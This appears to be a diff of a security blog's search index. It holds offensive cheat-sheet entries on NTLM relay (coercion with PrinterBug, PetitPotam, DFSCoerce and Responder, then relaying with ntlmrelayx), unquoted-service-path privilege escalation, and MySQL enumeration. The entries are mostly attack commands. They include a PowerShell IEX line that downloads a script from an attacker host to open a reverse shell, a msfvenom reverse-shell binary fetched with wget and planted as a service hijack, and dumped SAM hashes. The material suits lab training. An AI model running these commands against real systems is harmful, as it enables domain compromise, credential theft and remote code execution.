-<p>➜ We can bypass this restriction by adding a crafted DNS record on the DC, formatted as <code>&lt;hostname&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -k --host &lt;dc_hostname&gt; add dnsRecord &lt;hostname&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>This makes the target’s SMB client resolve our attacker IP as itself, so when <code>lsass.exe</code> (running as SYSTEM) is coerced via PetitPotam, the relay now succeeds back to the same host, giving us a SAM&#x2F;LSA dump on the DC.</p>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Machines-With-signing-False"><a href="#Enumerate-Machines-With-signing-False" class="headerlink" title="Enumerate Machines With signing:False"></a>Enumerate Machines With <code>signing:False</code></h4><blockquote>
-<p>RunFinger.py</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 RunFinger.py -i ip-range</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>NetExec</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb ip-range --gen-relay-list relayTargets.txt</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Nmap</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -Pn --script=smb2-security-mode.nse -p 445 ip-range --open</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h3 id="Coerce-Method-Coerce-Machine-Account"><a href="#Coerce-Method-Coerce-Machine-Account" class="headerlink" title="Coerce Method  : Coerce Machine Account"></a>Coerce Method  : Coerce Machine Account</h3><blockquote>
-<p>➜ We only need domain user credentials </p>
-</blockquote>
-<h5 id="PrinterBug-MS-RPRN"><a href="#PrinterBug-MS-RPRN" class="headerlink" title="PrinterBug (MS-RPRN)"></a>PrinterBug (MS-RPRN)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target_ip&gt; &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="PetitPotam-MS-EFSR"><a href="#PetitPotam-MS-EFSR" class="headerlink" title="PetitPotam (MS-EFSR)"></a>PetitPotam (MS-EFSR)</h5><blockquote>
-<p>➜ if the system is not patched for CVE-2021-36942 we don’t need credentials</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py &lt;attacker_ip&gt; &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="DFSCoerce-MS-DFSNM"><a href="#DFSCoerce-MS-DFSNM" class="headerlink" title="DFSCoerce (MS-DFSNM)"></a>DFSCoerce (MS-DFSNM)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dfscoerce.py -u &lt;user&gt; -p &lt;password&gt; &lt;attacker_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Coercer-automated-all-three-above"><a href="#Coercer-automated-all-three-above" class="headerlink" title="Coercer (automated, all three above)"></a>Coercer (automated, all three above)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Coercer coerce -t &lt;target_ip&gt; -l &lt;attacker_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -v --always-continue</span><br></pre></td></tr></table></figure>
-
-<h5 id="NetExec-coerce-plus"><a href="#NetExec-coerce-plus" class="headerlink" title="NetExec coerce_plus"></a>NetExec coerce_plus</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M coerce_plus -o LISTENER=&lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Coerce-Method-Coerce-User-Account"><a href="#Coerce-Method-Coerce-User-Account" class="headerlink" title="Coerce Method  : Coerce User Account"></a>Coerce Method  : Coerce User Account</h3><blockquote>
-<p>➜ We need only <code>Write access</code> to a shared folder </p>
-</blockquote>
-<h5 id="ntlm-theft"><a href="#ntlm-theft" class="headerlink" title="ntlm_theft"></a>ntlm_theft</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 ntlm_theft.py -g all -s &lt;attacker_ip&gt; -f &lt;payload_name&gt;</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //&lt;target_ip&gt;/&lt;share&gt; -U &lt;user&gt;</span><br><span class="line"></span><br><span class="line">smb: \&gt; put &lt;payload_name&gt;.lnk</span><br></pre></td></tr></table></figure>
-
-<h5 id="Slinky-nxc-module"><a href="#Slinky-nxc-module" class="headerlink" title="Slinky ( nxc module)"></a>Slinky ( nxc module)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;target_ip&gt; -u &lt;user&gt; -p &lt;password&gt; -M slinky -o SERVER=&lt;attacker_ip&gt; NAME=&lt;lure_name&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="MSSQL-UNC-path-coercion"><a href="#MSSQL-UNC-path-coercion" class="headerlink" title="MSSQL UNC path coercion"></a>MSSQL UNC path coercion</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mssqlclient.py <span class="string">&#x27;inlanefreight/plaintext$:PASS@&lt;target_ip&gt;&#x27;</span> -windows-auth</span><br><span class="line"></span><br><span class="line">SQL (plaintext$ guest@master)&gt; xp_dirtree \\&lt;attacker_ip&gt;\test.txt</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="LLMNR-NBT-NS-mDNS-poisoning"><a href="#LLMNR-NBT-NS-mDNS-poisoning" class="headerlink" title="LLMNR &#x2F; NBT-NS &#x2F; mDNS poisoning"></a>LLMNR &#x2F; NBT-NS &#x2F; mDNS poisoning</h5><blockquote>
-<p>Unlike the other coerce methods we can’t choose who gets coerced, we wait for any user to  mistype a hostname then responder answer the request</p>
-</blockquote>
-<blockquote>
-<p>➜ Disable Responder’s SMB and HTTP servers (so <code>ntlmrelayx</code> can use them):</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/SMB = On/SMB = Off/&quot;</span> Responder.conf</span><br><span class="line">sed -i <span class="string">&quot;s/HTTP = On/HTTP = Off/&quot;</span> Responder.conf</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Start Responder to poison name-resolution broadcasts:</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 Responder.py -I &lt;interface&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Relay-Post-Exploitation"><a href="#Relay-Post-Exploitation" class="headerlink" title="Relay &amp; Post-Exploitation"></a>Relay &amp; Post-Exploitation</h3><blockquote>
-<p>Regardless of which coercion method above was used, the captured SMB authentication is relayed with the same way</p>
-</blockquote>
-<blockquote>
-<p>Single target</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t &lt;target_ip&gt; -smb2support</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t smb://&lt;hostname&gt;.&lt;domain&gt; -smb2support</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Multiple Machines </p>
-</blockquote>
-<blockquote>
-<p>We need to update <code>relayTargets.txt </code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smb://IP</span><br><span class="line">smb://hostname.domain.local</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Then</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -tf relayTargets.txt -smb2support</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Normal-User"><a href="#Normal-User" class="headerlink" title="Normal User"></a>Normal User</h5><blockquote>
-<p>If the relayed account is a normal user (non-admin), we can’t SAM dump or RCE , we can only use <code>-i</code> for an interactive SMB session and access shares that the relayed user can read and write.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t &lt;target_ip&gt; -smb2support -i</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nv 127.0.0.1 11000</span><br><span class="line"></span><br><span class="line"><span class="comment"># shares</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="Admin-User"><a href="#Admin-User" class="headerlink" title="Admin User"></a>Admin User</h5><blockquote>
-<p>If the relayed account is a local <code>admin user</code> on the machine that we relayed to, <code>ntlmrelayx</code> will automatically <code>dump SAM</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Authenticating against smb://&lt;target_ip&gt; as &lt;DOMAIN&gt;/&lt;USER&gt; SUCCEED</span><br><span class="line">[*] Target system bootKey: 0x563136fa4deefac97a5b7f87dca64ffa</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Command execution &#x2F; reverse shell</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -t &lt;target_ip&gt; -smb2support -c</span><br><span class="line"><span class="string">&quot;powershell -c IEX(New-Object NET.WebClient).DownloadString(&#x27;http://&lt;attacker_ip&gt;:Port/Invoke-PowerShellTcp.ps1&#x27;);Invoke-PowerShellTcp -Reverse -IPAddress &lt;attacker_ip&gt; -Port Port&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Socks"><a href="#Socks" class="headerlink" title="Socks"></a>Socks</h5><blockquote>
-<p>If we want the relayed session to keep alive we can use <code>-socks</code> flag with <code>ntlmrelayx</code> </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py -tf relayTargets.txt -smb2support -socks</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Then we can use any tool with <code>proxychains</code></p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4 -q smbexec.py &lt;domain&gt;/&lt;user&gt;@&lt;target_ip&gt; -no-pass</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>NTLM Relay</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-        <tag>PetitPotam</tag>
-        <tag>DFSCoerce</tag>
-        <tag>Responder</tag>
       </tags>
   </entry>
   <entry>
@@ -1663,6 +1470,11 @@
         <tag>kinit</tag>
         <tag>KeyTabExtract</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Permissive File System ACLs</title>
+    <url>/2026/06/19/Permissive-File-System-ACLs/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>Pivoting And Port Forwarding</title>
@@ -2127,69 +1939,44 @@
       </categories>
   </entry>
   <entry>
-    <title>Unquoted Service Path</title>
-    <url>/2026/06/16/Unquoted-Service-Path/</url>
-    <content><![CDATA[<p> &gt;➜ Unquoted Service Path occurs when a service binary path contains spaces and is not enclosed in quotes, causing Windows to search and execute executables in unintended locations. If an attacker can place a malicious executable in one of these searched paths, they can hijack the service and execute code with the service’s privileges, such as SYSTEM.<br> &gt;<br> &gt;➜ Example :<br> &gt;<br> &gt;➜ If the service binary path is :</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</span><br></pre></td></tr></table></figure>
-
-<p> &gt;➜ Windows will attempt to execute the following paths in order :<br> &gt;<br> &gt; - <code>C:\Program.exe</code><br> &gt; - <code>C:\Program Files.exe</code><br> &gt; - <code>C:\Program Files (x86)\System.exe</code><br> &gt; - <code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code></p>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Unquoted-Service-Paths"><a href="#Enumerate-Unquoted-Service-Paths" class="headerlink" title="Enumerate Unquoted Service Paths"></a>Enumerate Unquoted Service Paths</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">htb</span>-<span class="title">student</span>&gt;<span class="title">wmic</span> <span class="title">service</span> <span class="title">get</span> <span class="title">name</span>,<span class="title">displayname</span>,<span class="title">startname</span>,<span class="title">pathname</span>,<span class="title">startmode</span> | <span class="title">findstr</span> /<span class="title">i</span> &quot;<span class="title">auto</span>&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;<span class="title">c</span>:\<span class="title">windows</span>\\&quot; | <span class="title">findstr</span> /<span class="title">i</span> /<span class="title">v</span> &quot;\&quot;&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GVFS.Service</span>          <span class="title">GVFS.Service</span>                 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">GVFS</span>\<span class="title">GVFS.Service.exe</span>                  <span class="title">Auto</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">System</span> <span class="title">Explorer</span> <span class="title">Service</span>   <span class="title">SystemExplorerHelpService</span>  <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)\<span class="title">System</span> <span class="title">Explorer</span>\<span class="title">service</span>\<span class="title">SystemExplorerService64.exe</span>      </span></span><br><span class="line"><span class="function"><span class="title">Auto</span></span></span><br></pre></td></tr></table></figure>
+    <title>MySQL Enumeration</title>
+    <url>/2025/11/21/MySQL-Enumeration/</url>
+    <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Service |</span><br><span class="line"><span class="built_in">Where-Object</span> &#123;</span><br><span class="line">    <span class="variable">$_</span>.StartMode <span class="operator">-eq</span> <span class="string">&#x27;Auto&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;C:\Windows*&#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-match</span> <span class="string">&#x27; &#x27;</span> <span class="operator">-and</span></span><br><span class="line">    <span class="variable">$_</span>.PathName <span class="operator">-notmatch</span> <span class="string">&#x27;^&quot;&#x27;</span></span><br><span class="line">&#125; |</span><br><span class="line"><span class="built_in">Select</span> Name, DisplayName, StartName, PathName</span><br><span class="line"></span><br><span class="line">GVFS.Service          GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                  Auto</span><br><span class="line"></span><br><span class="line">System Explorer Service   SystemExplorerHelpService  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe      </span><br><span class="line">Auto</span><br></pre></td></tr></table></figure>
+<h1 id="Enumerate-Version"><a href="#Enumerate-Version" class="headerlink" title="Enumerate Version"></a>Enumerate Version</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@version</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Enumerate-Database"><a href="#Enumerate-Database" class="headerlink" title="Enumerate Database"></a>Enumerate Database</h1><h3 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> DATABASES; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br></pre></td></tr></table></figure>
+<h3 id="Check-Current-Database"><a href="#Check-Current-Database" class="headerlink" title="Check Current Database"></a>Check Current Database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DATABASE();</span><br></pre></td></tr></table></figure>
+
+<h3 id="List-tables-in-current-database"><a href="#List-tables-in-current-database" class="headerlink" title="List tables in current database"></a>List tables in current database</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;  </span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>DATABASE();  </span><br></pre></td></tr></table></figure>
+<h3 id="List-columns-in-specific-table"><a href="#List-columns-in-specific-table" class="headerlink" title="List columns in specific table"></a>List columns in specific table</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> table_name;  </span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<h3 id="Find-sensitive-columns"><a href="#Find-sensitive-columns" class="headerlink" title="Find sensitive columns"></a>Find sensitive columns</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, column_name <span class="keyword">FROM</span> information_schema.COLUMNS  </span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%password%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pass%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%pwd%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%secret%&#x27;</span>  </span><br><span class="line"><span class="keyword">OR</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%token%&#x27;</span>;  </span><br></pre></td></tr></table></figure>
+<h3 id="Count-rows-in-tables"><a href="#Count-rows-in-tables" class="headerlink" title="Count rows in tables"></a>Count rows in tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name, table_rows <span class="keyword">FROM</span> information_schema.TABLES  </span><br><span class="line"><span class="keyword">WHERE</span> table_schema <span class="operator">=</span> DATABASE();</span><br></pre></td></tr></table></figure>
 
 
-<p> &gt;➜ As we can see, these two services have unquoted service paths and may be vulnerable to privilege escalation if writable directories are present.</p>
-<h4 id="Checking-Directory-Permissions"><a href="#Checking-Directory-Permissions" class="headerlink" title="Checking Directory Permissions"></a>Checking Directory Permissions</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer\service\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\System Explorer&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(RX)</span><br><span class="line">                                                     Everyone:(I)(RX)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+<h1 id="Users-Enumeration"><a href="#Users-Enumeration" class="headerlink" title="Users Enumeration"></a>Users Enumeration</h1><h4 id="List-MySQL-users"><a href="#List-MySQL-users" class="headerlink" title="List MySQL users"></a>List MySQL users</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user;</span><br></pre></td></tr></table></figure>
 
+<h4 id="Check-Current-User"><a href="#Check-Current-User" class="headerlink" title="Check Current User"></a>Check Current User</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();  </span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&quot;C:\Program Files (x86)\&quot;</span></span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\                              BUILTIN\Users:(I)(F)</span><br><span class="line">                                                     Everyone:(I)(F)</span><br><span class="line">                                                     NT AUTHORITY\SYSTEM:(I)(F)</span><br></pre></td></tr></table></figure>
+<h4 id="List-users-with-FILE-privilege"><a href="#List-users-with-FILE-privilege" class="headerlink" title="List users with FILE privilege"></a>List users with FILE privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> File_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;  </span><br></pre></td></tr></table></figure>
 
-
-<blockquote>
-<p>➜ We have write permission on <code>C:\Program Files (x86)\</code>, allowing us to place a malicious executable in this directory.</p>
-</blockquote>
-<h1 id="Exploiting-the-Unquoted-Service-Path"><a href="#Exploiting-the-Unquoted-Service-Path" class="headerlink" title="Exploiting the Unquoted Service Path"></a>Exploiting the Unquoted Service Path</h1><blockquote>
-<p>Create malicious binary</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions msfvenom -p windows/shell_reverse_tcp LHOST=Our-IP LPORT=Listening-Port -f exe &gt; System.exe</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Transfer binary to target</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wget</span> http://Our<span class="literal">-IP</span>:port/System.exe <span class="literal">-O</span> <span class="string">&quot;C:\Program Files (x86)\System.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Restart the service</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe stop SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe <span class="built_in">start</span> SystemExplorerHelpService</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Get Reverse Shell</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-permissions rlwrap nc -lvnp 8888</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
-
+<p>Or</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> file_priv <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;current_user&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="List-users-with-SUPER-privilege"><a href="#List-users-with-SUPER-privilege" class="headerlink" title="List users with SUPER privilege"></a>List users with SUPER privilege</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>, host <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Super_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
+        <category>Enumeration</category>
+        <category>Service-Enumeration</category>
+        <category>MySQL</category>
       </categories>
       <tags>
-        <tag>wmic</tag>
-        <tag>Unquoted-Service-Path</tag>
-        <tag>Windows-Services</tag>
-        <tag>Service-Hijacking</tag>
-        <tag>icacls</tag>
-        <tag>msfvenom</tag>
-        <tag>Weak-Permissions</tag>
+        <tag>Enumeration</tag>
+        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
@@ -2222,15 +2009,168 @@
         <category>Windows Privesc</category>
       </categories>
       <tags>
-        <tag>Windows-Services</tag>
-        <tag>Weak-Service-Permissions</tag>
-        <tag>Modifiable-Service</tag>
-        <tag>Service-Configuration</tag>
-        <tag>SERVICE_ALL_ACCESS</tag>
-        <tag>SERVICE_CHANGE_CONFIG</tag>
+        <tag>Permissive-File-System-ACLs</tag>
+        <tag>Modifiable-Service-Binary</tag>
+        <tag>Weak-ACL</tag>
+        <tag>Service-Binary-Replacement</tag>
+        <tag>icacls</tag>
         <tag>AccessChk</tag>
         <tag>SharpUp</tag>
+        <tag>msfvenom</tag>
         <tag>sc.exe</tag>
+        <tag>Windows-Services</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NTLM relay SMB To SMB</title>
+    <url>/2026/06/12/NTLM-relay-SMB-To-SMB/</url>
+    <content><![CDATA[<h1 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h1><blockquote>
+<ul>
+<li><p>The machine we relay from should be vulnerable to one of these coercion methods</p>
+</li>
+<li><p><code>SMB signing</code> on the machine we relay to should be <code>disabled</code> or <code>enabled</code>.</p>
+</li>
+</ul>
+</blockquote>
+<p><img src="/img/ntlm-relay-smb-to-smb.png" alt="NTLM Relay SMB to SMB"></p>
+<blockquote>
+<p>➜ Self-relay (relaying back to the same host that authenticated) has been patched since MS08-068, the machine we relay to must therefore be a different machine from the machine we relay from.</p>
+</blockquote>
+<blockquote>
+<p>➜ We can bypass this restriction by adding a crafted DNS record on the DC, formatted as <code>&lt;hostname&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodyAD -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -k --host &lt;dc_hostname&gt; add dnsRecord &lt;hostname&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>This makes the target’s SMB client resolve our attacker IP as itself, so when <code>lsass.exe</code> (running as SYSTEM) is coerced via PetitPotam, the relay now succeeds back to the same host, giving us a SAM&#x2F;LSA dump on the DC.</p>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerate-Machines-With-signing-False"><a href="#Enumerate-Machines-With-signing-False" class="headerlink" title="Enumerate Machines With signing:False"></a>Enumerate Machines With <code>signing:False</code></h4><blockquote>
+<p>RunFinger.py</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 RunFinger.py -i ip-range</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>NetExec</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb ip-range --gen-relay-list relayTargets.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Nmap</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -Pn --script=smb2-security-mode.nse -p 445 ip-range --open</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h3 id="Coerce-Method-Coerce-Machine-Account"><a href="#Coerce-Method-Coerce-Machine-Account" class="headerlink" title="Coerce Method  : Coerce Machine Account"></a>Coerce Method  : Coerce Machine Account</h3><blockquote>
+<p>➜ We only need domain user credentials </p>
+</blockquote>
+<h5 id="PrinterBug-MS-RPRN"><a href="#PrinterBug-MS-RPRN" class="headerlink" title="PrinterBug (MS-RPRN)"></a>PrinterBug (MS-RPRN)</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target_ip&gt; &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure>
+
